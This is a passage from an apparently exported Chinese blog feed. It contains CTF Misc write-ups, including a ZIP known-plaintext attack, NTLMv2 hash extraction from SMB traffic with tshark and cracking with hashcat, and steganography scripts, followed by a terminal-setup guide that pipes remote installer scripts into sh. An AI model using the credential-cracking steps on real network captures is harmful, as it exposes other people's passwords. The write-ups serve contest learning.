class="string">&quot;-&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> validate_idcard(idcard):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">f&quot;idcard,<span class="subst">&#123;idcard&#125;</span>\n&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> mpx:</span><br><span class="line">                mpx[<span class="string">f&quot;idcard,<span class="subst">&#123;idcard&#125;</span>\n&quot;</span>] = <span class="number">1</span></span><br><span class="line">                result += <span class="string">f&quot;idcard,<span class="subst">&#123;idcard&#125;</span>\n&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> phones:</span><br><span class="line">        <span class="built_in">print</span>(_)</span><br><span class="line">        phone = _.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;-&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> validate_phone(phone):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">f&quot;phone,<span class="subst">&#123;phone&#125;</span>\n&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> mpx:</span><br><span class="line">                mpx[<span class="string">f&quot;phone,<span class="subst">&#123;phone&#125;</span>\n&quot;</span>] = <span class="number">1</span></span><br><span class="line">                result += <span class="string">f&quot;phone,<span class="subst">&#123;phone&#125;</span>\n&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> ips:</span><br><span class="line">        <span class="keyword">if</span> check_ip(_):</span><br><span class="line">            <span class="keyword">if</span> _ <span class="keyword">not</span> <span class="keyword">in</span> mpx:</span><br><span class="line">                mpx[_] = <span class="number">1</span></span><br><span class="line">                result += <span class="string">f&quot;ip,<span class="subst">&#123;_&#125;</span>\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># open(&quot;unhex.txt&quot;, &quot;w&quot;, encoding=&quot;utf-8&quot;).write(result3)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">open</span>(<span class="string">&quot;result2.csv&quot;</span>, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>).write(result)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>题解</category>
      </categories>
      <tags>
        <tag>Misc</tag>
      </tags>
  </entry>
  <entry>
    <title>2024 浙江省赛初赛 Misc方向 全WriteUp</title>
    <url>//post/2024zjctfcs/</url>
    <content><![CDATA[<h3 id="签到">签到</h3>
<h4 id="第二题">第二题</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">6L&lt;Ak3,*@VM*&gt;7U&amp;FZFNWc,Ib=t,X!+,BnSDfoaNhdiO*][5F];eV^]Lm&amp;?$&#x27;&lt;oeGH&amp;6tqcgK_JDp-3;8wh?Si,G$BarTFjE?b$eR/,Igij&lt;(&#123;u90M$5If589[&lt;4+jp%3_%R(526#1J|m5p&amp;H+%.#d0&lt;DmLK*#-\8w:xD2Y[3jO&#123;l8[)&lt;(F[=Bcixb&gt;Jp^%L2XvVTzW@9OTko/P74d1sFscEbMO7Vhp&amp;HM;+ww/v[KM1%2M*7O\&#125;rEZM.LM0&#x27;\iwK:])pg-nJef\Rt4</span><br></pre></td></tr></table></figure>
<p>使用CyberChef：Base92 -&gt; Base85 -&gt; Base64 -&gt; Base62 -&gt; Base58 -&gt; Base45 -&gt; Base32</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ssqd1.png"
                        alt="1"
                 ></p>
<p>可获得flag</p>
<h3 id="Misc">Misc</h3>
<h4 id="RealSignin">RealSignin</h4>
<p>得到一张png图片，zsteg一下<img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241102162038038.png"
                        alt=""
                 ></p>
<p>文件末尾的是密文，LSB隐写了base表</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241102162238054.png"
                        alt="image-20241102162238054"
                 ></p>
<h4 id="机密文档">机密文档</h4>
<p>下载后发现文件是加密的，经尝试后发现是明文攻击<img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/PixPin_2024-11-02_14-35-03.png"
                        alt="PixPin_2024-11-02_14-35-03"
                 ></p>
<p>如图，使用<code>echo -n &quot;the_secret_you_never_ever_know_hahahaha&quot; &gt; mingwen.txt</code>命令可以将内容写入<code>mingwen.txt</code>，这段明文已经超过8字节，加上已知的<code>50 4B 03 04</code>进行明文攻击，可知偏移量为<code>30</code>，得到如图三段密钥，然后得到密钥后使用三段密钥修改文件密码为<code>111111</code>，然后解压得到一个docm文件，修改后缀为zip后解压，在media文件夹内找到一张图</p>
<p>打开docm文件可以看到<code>宏已被禁用</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">olevba  the_secret_you_never_ever_know_hahahaha.docm &gt; test.txt</span><br></pre></td></tr></table></figure>
<p>可以发现一个异或的逻辑</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/PixPin_2024-11-02_14-42-40.png"
                        alt="PixPin_2024-11-02_14-42-40"
                 ></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = [<span class="number">26</span>, <span class="number">25</span>, <span class="number">28</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">1</span>, <span class="number">74</span>, <span class="number">75</span>, <span class="number">45</span>, <span class="number">29</span>, <span class="number">19</span>, <span class="number">49</span>, <span class="number">61</span>, <span class="number">60</span>, <span class="number">3</span>]</span><br><span class="line">key =  <span class="string">&quot;outguess&quot;</span></span><br><span class="line">key_len = <span class="built_in">len</span>(key)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">    tmp = data[i] ^ <span class="built_in">ord</span>(key[(i % key_len)])</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(tmp),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>第47行为异或后的key，用它解media里的图片 outguess隐写即可</p>
<p>要把后缀名改成jpg</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/PixPin_2024-11-02_14-41-58.png"
                        alt="PixPin_2024-11-02_14-41-58"
                 ></p>
<p>解得flag</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241102164145781.png"
                        alt="image-20241102164145781"
                 ></p>
<h4 id="eztraffic">eztraffic</h4>
<p>打开查看协议分级，发现主要为SMB流量，尝试导出SMB对象，获得<code>final_out.zip</code></p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241106204050166.png"
                        alt="image-20241106204050166"
                 ></p>
<p>打开后看到注释</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241106204141917.png"
                        alt="image-20241106204141917"
                 ></p>
<p>猜测是SMB协议传输的NTLM密码+五位数字掩码攻击获得flag，使用tshark导出</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tshark -n -r eztraffic.pcapng -Y <span class="string">&#x27;ntlmssp.messagetype == 0x00000003&#x27;</span> -T fields -e ntlmssp.auth.username -e ntlmssp.auth.domain -e ntlmssp.ntlmv2_response.ntproofstr -e ntlmssp.auth.sesskey -e smb2.sesid</span><br></pre></td></tr></table></figure>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241106204254865.png"
                        alt="image-20241106204254865"
                 ></p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">username::domain:ServerChallenge:NTproofstring:modifiedntlmv2response</span><br><span class="line">#根据这个格式找到下面的格式然后hashcat爆破</span><br><span class="line">rockyou::MicrosoftAccount:4936df20962cae6d:db12ced50faf52f141636e80205e8f28:01010000000000003604281b951fdb017b4045aa008508eb0000000002001e00440042004500440036004200350041002d0035003100430032002d00340001001e00440042004500440036004200350041002d0035003100430032002d00340004004800640062006500640036006200350061002d0035003100630032002d0034003100650063002d0061006400380034002d0064006400320062003500370030006400350030003900360003004800640062006500640036006200350061002d0035003100630032002d0034003100650063002d0061006400380034002d00640064003200620035003700300064003500300039003600070008003604281b951fdb01060004000200000008003000300000000000000001000000002000008029a5d8256e5c2762f439df5c06f3bc411fb0faeb3a6fa52d9273c57b09f2d10a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e0031002e00380031000000000000000000</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -m 5600 hash.txt rockyou.txt</span><br></pre></td></tr></table></figure>
<p>得到密码<code>haticehatice</code>，并进行掩码攻击</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241105125829668.png"
                        alt="image-20241105125829668"
                 ></p>
<p>得到解压密码后获得100张图片，在每张图片的<code>Red 0</code>通道中找到一张隐写的二维码，扫描二维码得到该图片在拼图中的顺序，写脚本完成拼图</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> pyzbar.pyzbar <span class="keyword">import</span> decode</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_lsb</span>(<span class="params">imgname</span>):</span><br><span class="line">    r = []</span><br><span class="line">    img = Image.<span class="built_in">open</span>(imgname)</span><br><span class="line">    width,height = img.size</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">            pixel = img.getpixel((x,y))</span><br><span class="line">            r.append(<span class="built_in">str</span>(pixel[<span class="number">0</span>] &amp; <span class="number">1</span>))</span><br><span class="line">            <span class="comment"># print(pixel)</span></span><br><span class="line">    bin_data = <span class="string">&#x27;&#x27;</span>.join(r)</span><br><span class="line">    <span class="keyword">return</span> bin_data  </span><br><span class="line">            </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bin2img</span>(<span class="params">bin_data</span>):</span><br><span class="line">    imgname = <span class="string">&quot;tmp.png&quot;</span></span><br><span class="line">    pixels = []</span><br><span class="line">    img = Image.new(<span class="string">&quot;RGB&quot;</span>,(<span class="number">50</span>,<span class="number">50</span>))</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> bin_data:</span><br><span class="line">        <span class="keyword">if</span> item ==<span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">            pixels.append((<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            pixels.append((<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line">    img.putdata(pixels)</span><br><span class="line">    <span class="comment"># img.show()</span></span><br><span class="line">    img = img.resize((<span class="number">500</span>,<span class="number">500</span>)) </span><br><span class="line">    <span class="comment"># 这里调整一下图片的大小，便于后面pyzbar的识别</span></span><br><span class="line">    img.save(imgname)</span><br><span class="line">    <span class="keyword">return</span> imgname</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_qrcode</span>(<span class="params">imgname</span>):</span><br><span class="line">    img = Image.<span class="built_in">open</span>(imgname)</span><br><span class="line">    decode_data = decode(img)</span><br><span class="line">    <span class="comment"># print(decode_data)</span></span><br><span class="line">    res = decode_data[<span class="number">0</span>].data.decode()</span><br><span class="line">    os.remove(imgname)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">        </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rename_img</span>():</span><br><span class="line">    filenames = os.listdir(<span class="string">&quot;./final_out&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> filename <span class="keyword">in</span> filenames:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            src_img = <span class="string">&quot;./final_out/&quot;</span>+filename</span><br><span class="line">            bin_data = extract_lsb(src_img)</span><br><span class="line">            imgname = bin2img(bin_data)</span><br><span class="line">            res = read_qrcode(imgname)</span><br><span class="line">            dst_img = <span class="string">f&quot;./final_out/<span class="subst">&#123;res&#125;</span>.png&quot;</span></span><br><span class="line">            os.rename(src_img,dst_img)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] <span class="subst">&#123;src_img&#125;</span> ===&gt; <span class="subst">&#123;dst_img&#125;</span> down!!!&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[-] <span class="subst">&#123;src_img&#125;</span> Error!!!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge_img</span>():</span><br><span class="line">    cols = <span class="number">10</span></span><br><span class="line">    rows = <span class="number">10</span></span><br><span class="line">    img_list = []</span><br><span class="line">    new_img = Image.new(<span class="string">&quot;RGB&quot;</span>,(<span class="number">500</span>,<span class="number">500</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">101</span>):</span><br><span class="line">        img = Image.<span class="built_in">open</span>(<span class="string">f&quot;./final_out/<span class="subst">&#123;i&#125;</span>.png&quot;</span>)</span><br><span class="line">        img_list.append(img)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(rows):</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(cols):</span><br><span class="line">            idx = y * cols + x</span><br><span class="line">            img = img_list[idx]</span><br><span class="line">            x_offset = x * <span class="number">50</span></span><br><span class="line">            y_offset = y * <span class="number">50</span></span><br><span class="line">            new_img.paste(img,(x_offset,y_offset))</span><br><span class="line">            </span><br><span class="line">    <span class="comment"># new_img.show()</span></span><br><span class="line">    new_img.save(<span class="string">&quot;flag.png&quot;</span>)</span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># rename_img()</span></span><br><span class="line">    merge_img()</span><br></pre></td></tr></table></figure>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241105145318142.png"
                        alt="image-20241105145318142"
                 ></p>
]]></content>
      <categories>
        <category>题解</category>
      </categories>
      <tags>
        <tag>Misc</tag>
      </tags>
  </entry>
  <entry>
    <title>2024强网拟态Misc方向部分 WriteUp</title>
    <url>//post/2024qwnt/</url>
    <content><![CDATA[<p>要我说这个osint真得是神题吧，，社了我一下午加一晚上，直接红温下机（我以后再也不会笑了</p>
<h3 id="ezflag">ezflag</h3>
<p>打开流量包，发现直接传输了一个zip压缩包</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241020105513319.png"
                        alt="image-20241020105513319"
                 ></p>
<p>然后选择 From Hex 然后下载转换后的压缩包即可</p>
<blockquote>
<p>Tips: 这里不推荐用CyberChef的magic功能，要不然转出来的压缩包会提示已损坏</p>
<p>易损坏的压缩包，需要我们自己去修复文件目录区和文件目录结束区</p>
<p>其实就是多了一位的错误数据</p>
</blockquote>
<p>压缩包解压后可以得到一个flag.zip，010查看发现是一张png图片，改后缀为png即可得到flag</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241020105534102.png"
                        alt="image-20241020105534102"
                 ></p>
<h3 id="PvZ">PvZ</h3>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241020105612311.png"
                        alt="image-20241020105612311"
                 ></p>
<p>提示md5(花费阳光)是解压密码</p>
<p>我是猜不到了，，写个脚本开爆</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_md5</span>(<span class="params">number</span>):</span><br><span class="line"></span><br><span class="line">    md5_hash = hashlib.md5(<span class="built_in">str</span>(number).encode()).hexdigest()</span><br><span class="line">    <span class="keyword">return</span> md5_hash</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;md5_hashes.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10001</span>):</span><br><span class="line"></span><br><span class="line">        md5_value = generate_md5(i)</span><br><span class="line"></span><br><span class="line">        f.write(<span class="string">f&#x27;<span class="subst">&#123;md5_value&#125;</span>\n&#x27;</span>)  </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;已写入md5_hashes.txt&quot;</span>)</span><br></pre></td></tr></table></figure>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241020105840067.png"
                        alt="image-20241020105840067"
                 ></p>
<p>二维码修复（最害怕的一集）</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241020105852465.png"
                        alt="image-20241020105852465"
                 ></p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241020105904760.png"
                        alt="image-20241020105904760"
                 ></p>
<p>仔细观察左下角，应该不是定位块，猜测二维码被偏移+旋转，修复后得到密文</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241020105918057.png"
                        alt="image-20241020105918057"
                 ></p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241020105927470.png"
                        alt="image-20241020105927470"
                 ></p>
<blockquote>
<p>[YG{VDTveRc10qpnJ+<em>)G!~f1{d@-}v&lt;)9xqYonsrqj0hPlkdcb(<code>Hd]#a</code>_A@VzZY;Qu8NMqKPONGkK-,BGF?cCBA@&quot;&gt;76Z:321U54-21</em>Non,+*#G’&amp;%d"y?w_uzsr8vunVrk1ongOe+ihgfeG]#[ZY^W\UZSwWVUNrRQ3IHGLEiCBAFE>=aA:9>765:981Uvu-2+O/.nm+Hi’~}|B&quot;!~}|u]s9qYonsrqj0hmlkjc)gIedcb[!YX]\UZSwWVUN6LpP2HMFEDhHG@dDCBA:^!~&lt;;:921U/u3,+<em>Non&amp;%</em>)('&amp;}C{cy?}|{zs[q7unVl2ponmleMib(fHG]b[Z~k</p>
</blockquote>
<p>这个时候回头去看图片的名字：M41b0lg3.png</p>
<p>把M41b0lg3转换为malbolge，上网一搜发现是一种编程语言，直接在线网站运行即可得到flag</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241020105949204.png"
                        alt="image-20241020105949204"
                 ></p>
<h3 id="Find-way-to-read-video">Find way to read video</h3>
<p>社工题，每个队伍得到的用户名不一样，所以flag也不一样，综合了几个队伍得到用户名形式是：五个英文+四个数字</p>
<p>附件解压出来的TXT就以下内容：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">bonan7654 has put his email template on a public platform.</span><br></pre></td></tr></table></figure>
<p>结果最终在GitCode上，社了一下午+一晚上，，结果这屎题在这种屎平台上</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241020112816702.png"
                        alt="image-20241020112816702"
                 ></p>
<p>然后根据<code>垃圾邮箱隐写</code>一类的提示，找到<code>spam</code></p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241020112915512.png"
                        alt="image-20241020112915512"
                 ></p>
<p>联想到<code>spammimic</code>隐写，直接在线网站：</p>
<p><a class="link"   href="https://www.spammimic.com/decode.cgi" >https://www.spammimic.com/decode.cgi<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <categories>
        <category>题解</category>
      </categories>
      <tags>
        <tag>Misc</tag>
      </tags>
  </entry>
  <entry>
    <title>记录自用的终端美化方案</title>
    <url>//post/BeautifyBash/</url>
    <content><![CDATA[<p><s>生产队的驴准备为自己选一个更趁手的磨盘</s>，所谓工作环境当然要赏心悦目才能更高效，下面分享一下自己在用的终端美化方案</p>
<h2 id="WSL-Ubuntu">WSL-Ubuntu</h2>
<p>Ubuntu自带的是bash，我认为zsh更加简洁，所以修改终端为zsh后使用oh-my-zsh主题，效果如图<img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/PixPin_2024-10-09_10-25-18.png"
                        alt="PixPin_2024-10-09_10-25-18"
                 ></p>
<h3 id="环境配置">环境配置</h3>
<h4 id="安装基本工具">安装基本工具</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 更新软件源</span></span><br><span class="line"><span class="built_in">sudo</span> apt update &amp;&amp; <span class="built_in">sudo</span> apt upgrade -y</span><br><span class="line"><span class="comment"># 安装 zsh git curl</span></span><br><span class="line"><span class="built_in">sudo</span> apt install zsh git curl -y</span><br></pre></td></tr></table></figure>
<p>设置默认终端为 zsh（<strong>注意：不要使用 sudo</strong>）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chsh -s /bin/zsh</span><br></pre></td></tr></table></figure>
<h3 id="安装-oh-my-zsh">安装 oh-my-zsh</h3>
<p>官网：<a class="link"   href="http://ohmyz.sh/%E3%80%82" >http://ohmyz.sh/。<i class="fas fa-external-link-alt"></i></a> 安装方式任选一个即可。</p>
<table>
<thead>
<tr>
<th style="text-align:left">方法</th>
<th style="text-align:left">命令</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><strong>curl</strong></td>
<td style="text-align:left"><code>sh -c &quot;$(curl -fsSL https://install.ohmyz.sh/)&quot;</code></td>
</tr>
<tr>
<td style="text-align:left"><strong>wget</strong></td>
<td style="text-align:left"><code>sh -c &quot;$(wget -O- https://install.ohmyz.sh/)&quot;</code></td>
</tr>
<tr>
<td style="text-align:left"><strong>fetch</strong></td>
<td style="text-align:left"><code>sh -c &quot;$(fetch -o - https://install.ohmyz.sh/)&quot;</code></td>
</tr>
</tbody>
</table>
<p>注意：同意使用 Oh-my-zsh 的配置模板覆盖已有的 <code>.zshrc</code></p>
<h3 id="配置主题">配置主题</h3>
<p>下载完想要的主题后，编辑 <code>~/.zshrc</code> 文件，将 <code>ZSH_THEME</code> 设为 <code>你想要的主题</code>。例如<code>lukerandall</code>、<code>robbyrussell</code>。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nano ~/.zshrc</span><br><span class="line"></span><br><span class="line">ZSH_THEME=<span class="string">&quot;你想要的主题&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">source</span> ~/.zshrc</span><br></pre></td></tr></table></figure>
<p>我使用的是默认主题。故该部分简略带过</p>
<h3 id="安装插件">安装插件</h3>
<p><code>oh-my-zsh</code> 已经内置了 <code>git</code> 插件，内置插件可以在 <code>～/.oh-my-zsh/plugins</code> 中查看，下面介绍一下我常用的插件，更多插件可以在 <a class="link"   href="https://github.com/unixorn/awesome-zsh-plugins" >awesome-zsh-plugins<i class="fas fa-external-link-alt"></i></a> 里查看。</p>
<h4 id="zsh-autosuggestions">zsh -autosuggestions</h4>
<p><a class="link"   href="https://github.com/zsh-users/zsh-autosuggestions" >zsh-autosuggestions<i class="fas fa-external-link-alt"></i></a> 是一个命令提示插件，当你输入命令时，会自动推测你可能需要输入的命令，按下右键可以快速采用建议。效果如下：</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241009103559263.png"
                        alt="image-20241009103559263"
                 ></p>
<p>安装方式：把插件下载到本地的 <code>~/.oh-my-zsh/custom/plugins</code> 目录。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-autosuggestions <span class="variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;</span>/plugins/zsh-autosuggestions</span><br></pre></td></tr></table></figure>
<h4 id="zsh-syntax-highlighting">zsh-syntax-highlighting</h4>
<p><a class="link"   href="https://github.com/zsh-users/zsh-syntax-highlighting" >zsh-syntax-highlighting<i class="fas fa-external-link-alt"></i></a> 是一个命令语法校验插件，在输入命令的过程中，若指令不合法，则指令显示为红色，若指令合法就会显示为绿色。效果如下：</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241009103726396.png"
                        alt="image-20241009103726396"
                 ></p>
<p>安装方式：把插件下载到本地的 <code>~/.oh-my-zsh/custom/plugins</code> 目录。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-syntax-highlighting.git <span class="variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;</span>/plugins/zsh-syntax-highlighting</span><br></pre></td></tr></table></figure>
<h4 id="z">z</h4>
<p><code>oh-my-zsh</code> 内置了 <code>z</code> 插件。<code>z</code> 是一个文件夹快捷跳转插件，对于曾经跳转过的目录，只需要输入最终目标文件夹名称，就可以快速跳转，避免再输入长串路径，提高切换文件夹的效率。</p>
<h4 id="extract">extract</h4>
<p><code>oh-my-zsh</code> 内置了 <code>extract</code> 插件。<code>extract</code> 用于解压任何压缩文件，不必根据压缩文件的后缀名来记忆压缩软件。使用 <code>x</code> 命令即可解压文件。</p>
<h4 id="web-search">web-search</h4>
<p>oh-my-zsh 内置了 <code>web-search</code> 插件。<code>web-search</code> 能让我们在命令行中使用搜索引擎进行搜索。使用<code>搜索引擎关键字+搜索内容</code> 即可自动打开浏览器进行搜索。</p>
<h3 id="启动插件">启动插件</h3>
<p>修改<code>~/.zshrc</code>中插件列表为：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">plugins=(git zsh-autosuggestions zsh-syntax-highlighting z extract web-search)</span><br></pre></td></tr></table></figure>
<p>部分插件需要参考插件介绍进行安装</p>
<p>然后重启终端即可使用</p>
<h3 id="ROOT用户启用">ROOT用户启用</h3>
<p>重复上述步骤即可</p>
<h2 id="Windows-PowerShell">Windows-PowerShell</h2>
<p>使用oh-my-posh默认主题美化，效果如图</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241009104518993.png"
                        alt="image-20241009104518993"
                 ></p>
<h3 id="环境配置-2">环境配置</h3>
<p>首先在Microsoft Store搜索下载oh-my-posh</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241009104304519.png"
                        alt="image-20241009104304519"
                 ></p>
<p>打开一个PowerShell，输入<code>$PORFILE</code>，查看配置文件所在位置</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241009104438608.png"
                        alt="image-20241009104438608"
                 ></p>
<p>也可以用everything直接找，如果不存在则手动创建即可</p>
<p>在配置文件中写入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\\Users\\67300\\AppData\\Local\\Programs\\oh-my-posh\\bin\\oh-my-posh.exe init pwsh --config $env:POSH_THEMES_PATH\montys.omp.json | Invoke-Expression</span><br><span class="line"></span><br><span class="line">需要自己根据情况更改，注意文件地址表示是否正确</span><br></pre></td></tr></table></figure>
<p>随后重启终端查看配置文件能否正常运行，如果顺利则可以正常使用</p>
<h3 id="报错处理">报错处理</h3>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241009104830606.png"
                        alt="image-20241009104830606"
                 ></p>
<p>以管理员身份打开一个新的终端，输入以下命令</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">start-process</span> PowerShell <span class="literal">-verb</span> runas</span><br><span class="line"></span><br><span class="line"><span class="built_in">set-executionpolicy</span> remotesigned</span><br></pre></td></tr></table></figure>
<p>然后重启终端即可。</p>
<p>如果遇到无法正常显示，显示为乱码或方框，则需要修改终端默认字体</p>
<p><a class="link"   href="https://www.nerdfonts.com/font-downloads" >Nerd Fonts - Iconic font aggregator, glyphs/icons collection, &amp; fonts patcher<i class="fas fa-external-link-alt"></i></a> 在这个网站上，ctrl + F 搜索<code>JetBrainsMono Nerd Font Mono</code>，然后下载并安装该字体</p>
<p><img  
                       lazyload
                       alt="image"
